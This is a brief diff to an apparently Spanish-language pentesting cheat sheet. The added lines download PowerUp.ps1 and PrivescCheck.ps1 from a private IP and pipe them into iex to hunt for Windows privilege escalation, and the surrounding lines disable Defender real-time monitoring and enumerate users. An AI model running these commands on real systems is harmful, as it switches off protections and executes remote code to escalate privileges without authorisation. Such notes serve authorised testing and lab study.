@@ -19,6 +19,15 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
 
+# Lanzar Scripts
+
+```bahs
+wget -useb 10.0.0.128/PowerUp.ps1| iex; Invoke-AllChecks
+
+
+wget -useb 10.0.0.128/PrivescCheck.ps1| iex; Invoke-PrivescCheck
+```
+
 - Ver usuarios disponibles
 ```powershell
 net user
